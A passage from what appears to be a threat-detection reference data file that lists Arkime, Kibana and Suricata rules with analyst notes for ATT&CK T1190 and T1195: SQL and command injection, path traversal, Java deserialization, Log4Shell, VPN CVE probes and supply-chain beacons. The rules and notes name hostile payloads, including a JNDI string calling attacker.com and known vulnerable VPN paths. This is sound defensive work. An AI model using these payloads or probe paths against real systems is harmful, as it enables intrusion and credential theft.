        cite: "MITRE ATT&CK T1190, CVE-2018-0171, Cisco Smart Install advisory, Salt Typhoon reporting"
      },
      {
        sub: "T1190 - Web App Injection",
        indicator: "SQL injection attempt - classic and blind patterns in HTTP request parameters",
        arkime: "ip.src != $MPNET\n&& protocols == http\n&& http.method == [GET, POST]\n&& http.uri == [\"*%27*\", \"*%22*\", \"*'+OR+*\", \"*'+AND+*\", \"*1=1*\", \"*1%3D1*\", \"*UNION+SELECT*\", \"*union%20select*\", \"*SLEEP(*\", \"*WAITFOR*\", \"*benchmark(*\", \"*;DROP*\", \"*;SELECT*\"]",
        kibana: "NOT source.ip: $MPNET\nAND http.request.method:\n  (GET OR POST)\nAND url.query: (\n  *%27* OR *'+OR+*\n  OR *UNION+SELECT*\n  OR *union%20select*\n  OR *SLEEP(* OR *WAITFOR*\n  OR *benchmark(*\n  OR *1=1*\n)",
        suricata: "alert http $EXTERNAL_NET any\n  -> $HTTP_SERVERS any\n  (msg:\"TA0001 T1190 SQL injection\n    attempt\";\n  flow:established,to_server;\n  content:\"GET\"; http.method;\n  pcre:\"/(\\%27|\\'|\\-\\-|\n    \\bOR\\b.+\\b1\\b.{0,10}\\b1\\b|\n    UNION.{0,10}SELECT|\n    SLEEP\\s*\\(|WAITFOR|\n    benchmark\\s*\\()/i\";\n  http.uri;\n  classtype:web-application-attack;\n  sid:9119001; rev:1;)",
        notes: "Classic SQLi patterns (%27 = single quote, %22 = double quote, OR 1=1, UNION SELECT) and blind SQLi time-based patterns (SLEEP(), WAITFOR DELAY, benchmark()) in HTTP parameters. Time-based blind SQLi generates distinctive response time anomalies visible in session timing data - normal responses take <200ms, SLEEP(5) attacks cause 5+ second responses. Baseline your application response times and alert on statistical outliers. A scanner hitting multiple endpoints with these patterns in rapid succession = automated SQLi scanner. A single targeted endpoint with carefully crafted payloads = manual or semi-automated exploitation.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Uses SQL injection against web applications in targeted intrusion operations, particularly against healthcare, technology, and gaming sector organizations." },
          { cls: "apt-ir", name: "APT33", note: "Has used SQL injection against energy sector web applications to gain initial access." },
          { cls: "apt-mul", name: "Multi", note: "SQL injection remains the most commonly exploited web application vulnerability class in nation-state and criminal intrusion campaigns." }
        ],
        cite: "MITRE ATT&CK T1190, OWASP, industry reporting"
      },
      {
        sub: "T1190 - Web App Injection",
        indicator: "Command injection - OS command execution via HTTP parameter",
        arkime: "ip.src != $MPNET\n&& protocols == http\n&& http.method == [GET, POST]\n&& http.uri == [\"*;id*\", \"*;whoami*\", \"*;cat+/etc/passwd*\", \"*%3Bcat*\", \"*%7Cid*\", \"*|whoami*\", \"*`id`*\", \"*$(id)*\", \"*%24%28*\", \"*%0Aid*\", \"*%0Awhoami*\"]",
        kibana: "NOT source.ip: $MPNET\nAND http.request.method:\n  (GET OR POST)\nAND url.query: (\n  *;id* OR *;whoami*\n  OR *%3Bcat* OR *%7Cid*\n  OR *|whoami* OR *$(id)*\n  OR *%0Aid* OR *%60id%60*\n)",
        suricata: "alert http $EXTERNAL_NET any\n  -> $HTTP_SERVERS any\n  (msg:\"TA0001 T1190 Command\n    injection attempt via HTTP\n    parameter\";\n  flow:established,to_server;\n  pcre:\"/(\\%3B|\\%7C|\\%60|\n    \\%0[aAdD]|\\||;|`)\n    \\s*(id|whoami|cat\\s+\\/etc|\n    wget|curl|bash|sh|\n    python|perl)/i\";\n  http.uri;\n  classtype:web-application-attack;\n  sid:9119002; rev:1;)",
        notes: "Command injection inserts OS commands into application parameters that are passed unsanitized to a shell - the classic first-stage commands are id, whoami, and cat /etc/passwd to confirm execution, followed by wget/curl to download a payload. The URL-encoded variants (%3B = ;, %7C = |, %60 = backtick, %0A = newline) are used to bypass WAF pattern matching. A 200 response with a response body containing root:x:0:0 or uid=0 in the body = successful exploitation. Monitor response bodies from your web servers for Unix/Windows system output patterns - successful command injection is immediately visible in the response.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Uses command injection against web applications as an initial access vector." },
          { cls: "apt-cn", name: "APT40", note: "Uses command injection against maritime and government sector web applications." },
          { cls: "apt-ir", name: "APT33", note: "Exploits command injection vulnerabilities in energy sector web-facing applications." }
        ],
        cite: "MITRE ATT&CK T1190, OWASP, industry reporting"
      },
      {
        sub: "T1190 - Web App Injection",
        indicator: "Path traversal / LFI - directory traversal attempt to read sensitive files",
        arkime: "ip.src != $MPNET\n&& protocols == http\n&& http.method == GET\n&& http.uri == [\"*../../../*\", \"*..%2F*\", \"*..%5C*\", \"*%2e%2e%2f*\", \"*%252e%252e*\", \"*/etc/passwd*\", \"*/windows/win.ini*\", \"*/proc/self/environ*\", \"*web.config*\", \"*.htaccess*\"]",
        kibana: "NOT source.ip: $MPNET\nAND http.request.method: GET\nAND url.path: (\n  *../../../* OR *..%2F*\n  OR *..%5C* OR *%2e%2e%2f*\n  OR */etc/passwd*\n  OR *win.ini* OR *web.config*\n  OR *.htaccess*\n)",
        suricata: "alert http $EXTERNAL_NET any\n  -> $HTTP_SERVERS any\n  (msg:\"TA0001 T1190 Path traversal\n    LFI attempt\";\n  flow:established,to_server;\n  content:\"GET\"; http.method;\n  pcre:\"/(\\.\\.[\\/\\\\]|\n    \\%2[eE]\\%2[eE]\\%2[fF5cC]|\n    \\%252[eE]|\n    \\/etc\\/passwd|\n    \\/windows\\/win\\.ini|\n    \\/proc\\/self|\n    web\\.config|\n    \\.htaccess)/i\";\n  http.uri;\n  classtype:web-application-attack;\n  sid:9119003; rev:1;)",
        notes: "Path traversal (../) reads files outside the web root - /etc/passwd confirms a Unix system and reveals usernames, /proc/self/environ reveals environment variables including credentials, web.config and .htaccess reveal application configuration including database credentials. Double URL encoding (%252e%252e = ../) bypasses WAFs that only decode once. A 200 response to a path traversal request containing root:x:0:0 or [system] (win.ini marker) = successful LFI exploitation. High-priority: LFI reading /proc/self/environ or web.config means credentials may be exposed in the response body visible in Zeek http.log or Arkime session data.",
        apt: [
          { cls: "apt-cn", name: "APT40", note: "Uses path traversal vulnerabilities against maritime, defense, and government sector web applications to read configuration files containing credentials." },
          { cls: "apt-ir", name: "APT33", note: "Exploits LFI vulnerabilities in energy sector web applications to read /etc/passwd and application configuration files." },
          { cls: "apt-mul", name: "Multi", note: "Path traversal and LFI are documented initial access vectors in multiple CISA advisories on nation-state exploitation of public-facing applications." }
        ],
        cite: "MITRE ATT&CK T1190, CISA advisories, industry reporting"
      },
      {
        sub: "T1190 - Deserialization / RCE",
        indicator: "Java deserialization exploit - ysoserial / gadget chain payload in HTTP body or header",
        kibana: "NOT source.ip: $MPNET\nAND http.request.body: (\n  *%ac%ed%00%05*\n  OR *rO0AB*\n  OR *KztAAU*\n)",
        suricata: "alert http $EXTERNAL_NET any\n  -> $HTTP_SERVERS any\n  (msg:\"TA0001 T1190 Java\n    deserialization exploit\n    payload\";\n  flow:established,to_server;\n  content:\"|ac ed 00 05|\";\n  classtype:web-application-attack;\n  sid:9119004; rev:1;)",
        notes: "Java serialized objects begin with the magic bytes 0xAC 0xED 0x00 0x05 - base64 encoded this becomes 'rO0AB'. Java deserialization exploits (ysoserial gadget chains) deliver these objects in HTTP request bodies, cookies, or custom headers to vulnerable Java applications (WebLogic, JBoss, Jenkins, Confluence). Content '|ac ed 00 05|' is the literal binary Java serialization magic. 'rO0AB' in base64-encoded form in a cookie or POST body is equally reliable. WebLogic T3/IIOP protocol also carries serialized payloads - watch TCP/7001 and TCP/7002 in addition to HTTP. This is a near-zero false positive indicator.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Exploits Java deserialization vulnerabilities in Oracle WebLogic, JBoss, and Apache Struts as primary initial access vectors against enterprise targets." },
          { cls: "apt-kp", name: "Lazarus", note: "Exploits Java deserialization in financial sector application servers." },
          { cls: "apt-mul", name: "Multi", note: "Java deserialization vulnerabilities in WebLogic (CVE-2019-2725, CVE-2020-14882) are documented as frequently exploited by nation-state and criminal actors in CISA Known Exploited Vulnerabilities advisories." }
        ],
        cite: "MITRE ATT&CK T1190, CISA KEV, industry reporting"
      },
      {
        sub: "T1190 - Deserialization / RCE",
        indicator: "Log4Shell (CVE-2021-44228) - JNDI lookup injection in HTTP headers",
        kibana: "NOT source.ip: $MPNET\nAND http.request.headers: (\n  *${jndi:* OR *jndi%3a*\n  OR *%24%7Bjndi%3A*\n  OR *${${::-j}*\n)",
        suricata: "alert http $EXTERNAL_NET any\n  -> $HTTP_SERVERS any\n  (msg:\"TA0001 T1190 Log4Shell\n    JNDI injection CVE-2021-44228\";\n  flow:established,to_server;\n  pcre:\"/(\\$\\{jndi:|\n    \\%24\\%7[Bb]jndi\\%3[Aa]|\n    \\$\\{\\$\\{::-j\\}|\n    jndi\\%3[Aa](ldap|rmi|dns|\n    corba))/i\";\n  http.header;\n  classtype:web-application-attack;\n  sid:9119005; rev:1;)",
        notes: "Log4Shell injects JNDI lookup strings (${jndi:ldap://attacker.com/exploit}) into any HTTP header that gets logged - User-Agent, X-Forwarded-For, Referer, Accept-Language, or custom headers. The obfuscated variants (${${::-j}${::-n}${::-d}${::-i}:...}) were developed specifically to bypass WAF pattern matching. Despite being disclosed in 2021 this is still actively exploited - unpatched Log4j instances in legacy Java applications remain common. The JNDI lookup triggers an outbound LDAP/RMI connection from your server to adversary infrastructure - monitor for unexpected outbound LDAP (TCP/389, TCP/636) or RMI (TCP/1099) from your web application servers as the follow-on indicator.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Weaponized Log4Shell within hours of disclosure for targeted intrusion operations." },
          { cls: "apt-ir", name: "APT33", note: "Exploits Log4Shell against energy sector applications." },
          { cls: "apt-kp", name: "Lazarus", note: "Used Log4Shell in cryptocurrency exchange and financial sector targeting." },
          { cls: "apt-ru", name: "Sandworm", note: "Exploits Log4Shell in operations against Ukrainian and European infrastructure." }
        ],
        cite: "MITRE ATT&CK T1190, CVE-2021-44228, CISA KEV"
      },
      {
        sub: "T1190 - VPN / Appliance CVE",
        indicator: "VPN appliance CVE path probe - known vulnerable endpoint enumeration",
        arkime: "ip.src != $MPNET\n&& protocols == http\n&& http.method == GET\n&& http.uri == [\"*/dana-na/auth/url_default*\", \"*/+CSCOE+/logon.html*\", \"*/remote/fgt_lang*\", \"*/api/v1/totp/user-backup-code*\", \"*/vpn/../vpns/cfg/*\", \"*/__CSCOE__*\", \"*/dana/html5acc/guacamole*\", \"*/cgi-bin/pkcs11.cgi*\"]",
        kibana: "NOT source.ip: $MPNET\nAND http.request.method: GET\nAND url.path: (\n  *dana-na/auth* OR *CSCOE*\n  OR *remote/fgt_lang*\n  OR *api/v1/totp/user-backup-code*\n  OR *vpn/../vpns/cfg*\n  OR *dana/html5acc/guacamole*\n  OR *cgi-bin/pkcs11.cgi*\n)",
        suricata: "alert http $EXTERNAL_NET any\n  -> $HOME_NET any\n  (msg:\"TA0001 T1190 VPN appliance\n    known CVE path probe\";\n  flow:established,to_server;\n  content:\"GET\"; http.method;\n  pcre:\"/(dana-na\\/auth\\/\n    url_default|\n    \\+CSCOE\\+\\/logon|\n    remote\\/fgt_lang|\n    api\\/v1\\/totp\\/\n    user-backup-code|\n    vpn\\/\\.\\.\\/vpns\\/cfg|\n    __CSCOE__|\n    dana\\/html5acc\\/guacamole|\n    cgi-bin\\/pkcs11\\.cgi)/i\";\n  http.uri;\n  classtype:web-application-attack;\n  sid:9119006; rev:1;)",
        notes: "URI signatures for known high-severity VPN CVEs: /dana-na/auth/url_default = Pulse Secure CVE-2019-11510 (unauthenticated file read), /+CSCOE+/logon.html = Cisco ASA CVE-2018-0296, /remote/fgt_lang = FortiOS CVE-2018-13379 (credential disclosure), /api/v1/totp/user-backup-code = Ivanti Connect Secure CVE-2023-35078, /vpn/../vpns/cfg/ = Citrix ADC CVE-2019-19781, /dana/html5acc/guacamole = Pulse Secure CVE-2021-22893, /cgi-bin/pkcs11.cgi = F5 BIG-IP CVE-2021-22986. These paths have no legitimate use - a 200 response to any of these is both a CVE probe success and a critical finding.",
        apt: [
          { cls: "apt-cn", name: "APT40", note: "Exploits Pulse Secure, Citrix, and Fortinet VPN CVEs as primary initial access vectors against government and defense sector targets." },
          { cls: "apt-cn", name: "Volt Typhoon", note: "Exploits VPN appliance vulnerabilities in US critical infrastructure targeting." },
          { cls: "apt-ir", name: "APT33", note: "Exploits FortiOS and Pulse Secure vulnerabilities against energy sector targets." },
          { cls: "apt-ru", name: "APT29", note: "Exploited Pulse Secure CVE-2021-22893 against government and defense targets in 2021." }
        ],
        cite: "MITRE ATT&CK T1190, CISA KEV, CISA advisories"
      },
      {
        sub: "T1190 - Post-Exploit Callback",
        indicator: "Post-exploitation outbound connection from application server - webshell or RCE callback",
        arkime: "ip.src == $DMZ_SERVERS\n&& protocols != [http, https, dns, ntp, syslog]\n&& ip.dst != $MPNET\n&& ip.dst != $ALLOWED_DEFAULTS\n&& port.dst == [4444, 1337, 8888, 9999, 6666, 443, 80, 8080]\n&& databytes.src > 0\n&& databytes.dst > 0",
        kibana: "source.ip: $DMZ_SERVERS\nAND NOT destination.ip: (\n  $MPNET OR $ALLOWED_DEFAULTS\n)\nAND NOT network.protocol: (\n  http OR dns OR ntp\n)\nAND destination.port: (\n  4444 OR 1337 OR 8888\n  OR 9999 OR 443 OR 80\n  OR 8080 OR 6666\n)",
        suricata: "alert tcp $HTTP_SERVERS any\n  -> $EXTERNAL_NET\n  [80,443,4444,1337,8080,\n   8443,8888,9999,6666]\n  (msg:\"TA0001 T1190 App server\n    unexpected outbound possible\n    webshell RCE callback\";\n  flow:established,to_server;\n  content:!\"|16 03|\"; depth:2;\n  content:!\"HTTP/\"; depth:7;\n  threshold:type both,\n    track by_src,\n    count 1, seconds 60;\n  classtype:trojan-activity;\n  sid:9119007; rev:1;)",
        notes: "After successful exploitation via webshell upload or RCE, the compromised application server initiates an outbound connection to the adversary's C2. Application and web servers have no legitimate reason to initiate outbound non-HTTP connections - any raw TCP outbound from a DMZ server to unknown external IPs is a critical finding. Content negation (!|16 03| = not TLS handshake, !'HTTP/' = not HTTP) catches raw shells and non-HTTP C2 on web ports. Immediate response: isolate the server, capture full PCAP, identify the webshell or exploited vulnerability. This is post-exploitation - the initial access has already succeeded.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Deploys webshells on compromised application servers that initiate outbound C2 connections, with the outbound callback from the DMZ server being a reliable post-exploitation indicator." },
          { cls: "apt-cn", name: "APT40", note: "Uses webshells and RCE exploitation to establish persistent access to government and defense sector web servers, with post-exploitation C2 visible as unexpected outbound connections." },
          { cls: "apt-ru", name: "Sandworm", note: "Deploys webshells on exploited web servers as a persistence mechanism with outbound C2 callbacks." }
        ],
        cite: "MITRE ATT&CK T1190, T1505.003, CISA advisories"
      },
      {
        sub: "T1190 - Mail Server Exploitation",
        indicator: "[OFF-NET TRIPWIRE] ProxyShell / ProxyLogon - Exchange autodiscover and EWS exploit path probing",
        arkime: "ip.src != $MPNET\n&& protocols == http\n&& http.method == [GET, POST, PROPFIND, MKCOL]\n&& http.uri == [\"*/autodiscover/autodiscover.json*\", \"*/ews/exchange.asmx*\", \"*/mapi/nspi*\", \"*/ecp/y.js*\", \"*/ecp/default.flt*\", \"*X-AnonResource-Backend*\", \"*/owa/auth/x.js*\"]\n&& ip.dst == $MAIL_SERVERS",
        kibana: "NOT source.ip: $MPNET\nAND destination.ip: $MAIL_SERVERS\nAND url.path: (\n  *autodiscover/autodiscover.json*\n  OR *ews/exchange.asmx*\n  OR *mapi/nspi*\n  OR *ecp/y.js*\n  OR *ecp/default.flt*\n  OR *owa/auth/x.js*\n)",
        suricata: "alert http $EXTERNAL_NET any\n  -> $HOME_NET any\n  (msg:\"TA0001 T1190 Exchange\n    ProxyShell ProxyLogon exploit\n    path probe\";\n  flow:established,to_server;\n  pcre:\"/(autodiscover\\/\n    autodiscover\\.json|\n    ews\\/exchange\\.asmx|\n    mapi\\/nspi|\n    ecp\\/[a-z]{1,3}\\.\n    (js|flt|aspx)|\n    owa\\/auth\\/[a-z]+\\.js)/i\";\n  http.uri;\n  classtype:web-application-attack;\n  sid:9119008; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-MPNet infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. ProxyLogon (CVE-2021-26855) uses /autodiscover/autodiscover.json with a Server header to bypass authentication - the X-AnonResource-Backend header is characteristic. ProxyShell (CVE-2021-34473/34523/31207) chains three vulnerabilities via autodiscover.json and EWS to achieve RCE. /ecp/y.js and /ecp/default.flt are characteristic ProxyShell staging paths. /mapi/nspi is used in NTLM relay attacks against Exchange. Any of these paths against your Exchange server from external IPs = immediate P1. Zeek http.log captures all Exchange request paths. Post-exploitation: watch for new files in Exchange inetpub paths and outbound HTTPS from the Exchange server to unknown IPs.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Exploited ProxyShell vulnerabilities against multiple sector targets within days of disclosure." },
          { cls: "apt-cn", name: "HAFNIUM", note: "First documented actor to exploit ProxyLogon (CVE-2021-26855) at scale against US defense, law, and infectious disease research organizations." },
          { cls: "apt-ru", name: "Sandworm", note: "Exploited Exchange vulnerabilities in European and government sector targeting." }
        ],
        cite: "MITRE ATT&CK T1190, CVE-2021-26855, CVE-2021-34473, CISA KEV"
      }
    ]
  },
  {
    id: "T1195",
    name: "Supply Chain Compromise",
    desc: ".001 Dependencies · .002 Software · .003 Hardware",
    rows: [
      {
        sub: "T1195.001 - Compromise Software Dependencies",
        indicator: "[OFF-NET TRIPWIRE] Build server / CI/CD agent making unexpected outbound connection - dependency exfil or backdoor C2",
        arkime: "ip.src == $BUILD_SERVERS\n&& protocols != [http, https, dns, ntp, git, ldap, syslog]\n&& ip.dst != $MPNET\n&& ip.dst != $EXTERNAL_PACKAGE_REGISTRIES\n&& port.dst == [443, 80, 8443, 4444, 1337, 8080, 9999]\n&& databytes.src > 0",
        kibana: "source.ip: $BUILD_SERVERS\nAND NOT destination.ip: (\n  $MPNET OR\n  $EXTERNAL_PACKAGE_REGISTRIES\n)\nAND destination.port: (\n  443 OR 80 OR 8443\n  OR 4444 OR 1337\n  OR 8080 OR 9999\n)\nAND source.bytes > 0",
        suricata: "alert tcp $BUILD_SERVERS any\n  -> $EXTERNAL_NET\n  [80,443,8443,4444,1337,8080]\n  (msg:\"TA0001 T1195.001 Build\n    server unexpected outbound\n    possible dep compromise\";\n  flow:established,to_server;\n  content:!\"|16 03|\"; depth:2;\n  content:!\"GET \"; depth:5;\n  content:!\"POST \"; depth:6;\n  threshold:type both,\n    track by_src,\n    count 1, seconds 60;\n  classtype:trojan-activity;\n  sid:9119501; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-MPNet infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Build servers (Jenkins, GitLab CI, GitHub Actions runners, Azure DevOps agents) have predictable network behavior - they pull from package registries (npm, PyPI, Maven, NuGet, Docker Hub) and source repositories, push artifacts to internal storage, and report back to orchestrators. Any outbound connection to non-package-registry destinations is anomalous. Compromised dependencies often beacon out from build agents during the build process - the malicious code runs in the CI environment with full credentials. Maintain $EXTERNAL_PACKAGE_REGISTRIES allowlist (registry.npmjs.org, pypi.org, maven.apache.org, *.docker.io, hub.docker.com, ghcr.io). Combine with EDR process data - node_modules postinstall scripts and pip install hooks are common compromise points.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Compromised the SolarWinds Orion build pipeline to inject SUNBURST malware into legitimate software updates, with the injection occurring during the CI/CD build process." },
          { cls: "apt-kp", name: "Lazarus", note: "Has compromised software supply chains via build infrastructure access in cryptocurrency exchange and software vendor targeting." },
          { cls: "apt-mul", name: "Multi", note: "Build server compromise is documented in multiple CISA and NIST supply chain security advisories as a high-impact attack vector with catastrophic downstream impact." }
        ],
        cite: "MITRE ATT&CK T1195.001, CISA ED-21-01, NIST SP 800-161"
      },
      {
        sub: "T1195.001 - Compromise Software Dependencies",
        indicator: "[OFF-NET TRIPWIRE] Typosquatting package fetch - internal host downloading from known typosquat namespace",
        arkime: "ip.src == $MPNET\n&& protocols == https\n&& host.http == [\"*registry.npmjs.org*\", \"*pypi.org*\", \"*files.pythonhosted.org*\", \"*rubygems.org*\", \"*crates.io*\"]\n&& http.uri == [\"*@*/-/*\", \"*/packages/*\", \"*/simple/*\", \"*/gems/*\"]\n&& http.uri == $KNOWN_TYPOSQUAT_PACKAGES",
        kibana: "source.ip: $MPNET\nAND url.domain: (\n  *registry.npmjs.org*\n  OR *pypi.org*\n  OR *files.pythonhosted.org*\n  OR *rubygems.org*\n  OR *crates.io*\n)\nAND url.path: $KNOWN_TYPOSQUAT_PACKAGES",
        suricata: "alert http $HOME_NET any\n  -> $EXTERNAL_NET 443\n  (msg:\"TA0001 T1195.001 Known\n    typosquat package fetch from\n    public registry\";\n  flow:established,to_server;\n  pcre:\"/Host:\\s*(registry\\.\n    npmjs\\.org|pypi\\.org|\n    files\\.pythonhosted\\.org|\n    rubygems\\.org|\n    crates\\.io)/i\";\n  http.header;\n  classtype:trojan-activity;\n  sid:9119502; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Typosquatting packages mimic legitimate names (reqests vs requests, electrn vs electron, lodahs vs lodash, colors-js vs colors.js). Maintain a $KNOWN_TYPOSQUAT_PACKAGES feed from threat intel sources (Snyk, Socket.dev, GitHub Advisory Database). Match against URL paths - npm uses /package-name/-/package-name-version.tgz, PyPI uses /packages/source/[hash]/[package-name]-[version].tar.gz. Also detect newly published packages that match high-target package name patterns. Internal package mirroring (Artifactory, Nexus) significantly reduces this risk - direct fetches from public registries by developer machines is the primary attack surface.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Has published typosquatting npm packages targeting cryptocurrency and blockchain developers." },
          { cls: "apt-kp", name: "Moonstone Sleet", note: "Published malicious packages to npm registry targeting blockchain and cryptocurrency development organizations." },
          { cls: "apt-mul", name: "Multi", note: "Typosquatting attacks against npm and PyPI are documented as a constant ongoing campaign with hundreds of malicious packages identified per month." }
        ],
        cite: "MITRE ATT&CK T1195.001, industry reporting"
      },
      {
        sub: "T1195.001 - Compromise Software Dependencies",
        indicator: "[OFF-NET TRIPWIRE] Dependency confusion - internal package name fetched from public registry",
        arkime: "ip.src == $MPNET\n&& protocols == https\n&& host.http == [\"*registry.npmjs.org*\", \"*pypi.org*\"]\n&& http.uri == $MPNET_PACKAGES\n&& ip.dst != $MPNET_PACKAGE_REGISTRY",
        kibana: "source.ip: $MPNET\nAND url.domain: (\n  *registry.npmjs.org*\n  OR *pypi.org*\n)\nAND url.path: $MPNET_PACKAGES\nAND NOT destination.ip: $MPNET_PACKAGE_REGISTRY",
        suricata: "alert http $HOME_NET any\n  -> $EXTERNAL_NET 443\n  (msg:\"TA0001 T1195.001 Internal\n    package name fetched from\n    public registry dep confusion\";\n  flow:established,to_server;\n  content:\"GET\"; http.method;\n  pcre:\"/Host:\\s*(registry\\.\n    npmjs\\.org|pypi\\.org)/i\";\n  http.header;\n  classtype:trojan-activity;\n  sid:9119503; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Dependency confusion (Alex Birsan 2021) attack: adversary publishes a package on a public registry using the name of an internal-only package - when the build system resolves dependencies, the higher version on the public registry is preferred over the internal one. Detection: maintain a list of your internal package names ($MPNET_PACKAGES) and alert when those names are fetched from public registries. The fetch should always be from your internal registry (Artifactory, Nexus, Verdaccio). Configure package managers with explicit registry pinning (.npmrc, pip.conf) to prevent the public lookup from happening at all.",
        apt: [
          { cls: "apt-mul", name: "Multi", note: "Dependency confusion attacks have been documented against major technology companies including Apple, Microsoft, Tesla, PayPal, Uber, and Yelp. The technique is widely exploited by both criminal actors and security researchers." }
        ],
        cite: "MITRE ATT&CK T1195.001, industry reporting"
      },
      {
        sub: "T1195.002 - Compromise Software Supply Chain",
        indicator: "[OFF-NET TRIPWIRE] Software updater connecting to non-vendor C2 infrastructure - Trojanized update detection",
        arkime: "ip.src == $MPNET\n&& protocols != [http, https, dns]\n&& ip.dst != $ALLOWED_UPDATE_SOURCES\n&& port.dst == [443, 80, 8080, 8443]\n&& databytes.src > 0\n&& databytes.dst > 0\n// Process-name correlation is not available in baseline Arkime 4.3.1 - it sees only network sessions, not the\n// process making the connection. The network-only signal here is anomalous outbound + non-vendor destination;\n// pair with EDR/Sysmon Event 3 in the SIEM to filter to updater processes (*update*, *agent*, *service*,\n// *daemon*) for high confidence.",
        kibana: "source.ip: $MPNET\nAND NOT destination.ip:\n  $ALLOWED_UPDATE_SOURCES\nAND destination.port: (\n  443 OR 80 OR 8080 OR 8443\n)\nAND process.name: (\n  *update* OR *agent*\n  OR *service* OR *daemon*\n)",
        suricata: "alert tcp $HOME_NET any\n  -> $EXTERNAL_NET\n  [80,443,8080,8443]\n  (msg:\"TA0001 T1195.002 Software\n    updater outbound to non-vendor\n    infrastructure\";\n  flow:established,to_server;\n  content:!\"|16 03|\"; depth:2;\n  threshold:type both,\n    track by_src,\n    count 1, seconds 60;\n  classtype:trojan-activity;\n  sid:9119504; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-MPNet infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Trojanized software updates (SolarWinds Orion, 3CX desktop client, MOVEit Transfer, Asus Live Update) generate post-install C2 connections to adversary-controlled infrastructure. Network signal: a known software updater process making outbound connections to IPs/domains that aren't part of the vendor's known infrastructure. Requires EDR process correlation to identify the source process. Maintain a $VENDOR_UPDATE_INFRA allowlist of legitimate update server IPs/domains for installed software (avsvmcloud.com domain pattern was the SUNBURST signal). Anomalous beaconing patterns from updaters - sleep + jitter, low data volume - are characteristic of supply chain backdoors waiting for activation.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Compromised SolarWinds Orion software updates with SUNBURST/SUPERNOVA backdoors, with infected updates beaconing to avsvmcloud.com infrastructure." },
          { cls: "apt-kp", name: "Lazarus", note: "Compromised the 3CX desktop client supply chain in 2023, with infected installations beaconing to adversary infrastructure." },
          { cls: "apt-cn", name: "APT41", note: "Documented compromising software supply chains in technology and gaming sector targeting." }
        ],
        cite: "MITRE ATT&CK T1195.002, CISA ED-21-01, Microsoft MSTIC"
      },
      {
        sub: "T1195.002 - Compromise Software Supply Chain",
        indicator: "Anomalous DNS query from updater process - DGA or sandbox evasion behavior",
        arkime: "ip.src == $MPNET\n&& protocols == dns\n&& dns.query.type == [A, AAAA]\n&& host.dns == [\"*avsvmcloud.com*\", \"*.appsync-api.*\", $EXTERNAL_C2_DOMAINS]\n// Process-name correlation is not available in baseline Arkime - pair with EDR/Sysmon Event 3 in the SIEM to\n// filter to updater processes (*update*, *agent*). DGA detection requires regex - not expressible\n// in pure Arkime. See Suricata pcre column or use Kibana KQL regex syntax for runtime matching.\n\n// Logical spec: host.dns matches\n//   /^[a-z0-9]{16,}\\.(com|net|org|info)$/",
        kibana: "source.ip: $MPNET\nAND dns.question.type:\n  (\"A\" OR \"AAAA\")\nAND dns.question.name: (\n  *avsvmcloud.com*\n  OR *appsync-api*\n  OR /[a-z0-9]{16,}\\.com/\n)",
        suricata: "alert dns $HOME_NET any\n  -> any 53\n  (msg:\"TA0001 T1195.002 Anomalous\n    DNS from updater DGA or\n    backdoor lookup\";\n  flow:stateless;\n  dns.query;\n  pcre:\"/^[a-z0-9]{16,}\\.\n    (com|net|org|info|us|biz)$/\";\n  classtype:trojan-activity;\n  sid:9119505; rev:1;)",
        notes: "Supply chain backdoors often use DGA (Domain Generation Algorithms) or hardcoded callback domains for C2. SUNBURST used DGA-style subdomains under avsvmcloud.com - the algorithm hashed the victim's domain and encoded it in the subdomain. Generic DGA detection: long alphanumeric subdomains (16+ chars) on common TLDs are statistically rare in legitimate traffic. Combine with process correlation - DGA queries from update.exe, javaupdate.exe, or vendor-named processes are high-confidence. Zeek dns.log captures all queries; build entropy-based detection on subdomain string patterns. SUNBURST specifically used a DGA that produced 16-32 character subdomains encoding the victim's AD domain.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "SUNBURST malware used DGA-style domain generation under avsvmcloud.com to encode victim domain identifiers in C2 lookups, allowing the adversary to identify high-value victims among the 18,000 SolarWinds customers exposed." },
          { cls: "apt-mul", name: "Multi", note: "DNS-based DGA detection is documented in NSA and CISA threat hunting guidance." }
        ],
        cite: "MITRE ATT&CK T1195.002, T1568.002, CISA ED-21-01"
      },
      {
        sub: "T1195.002 - Compromise Software Supply Chain",
        indicator: "[OFF-NET TRIPWIRE] HTTPS beacon with anomalous JA4 from established software process - supply chain implant",
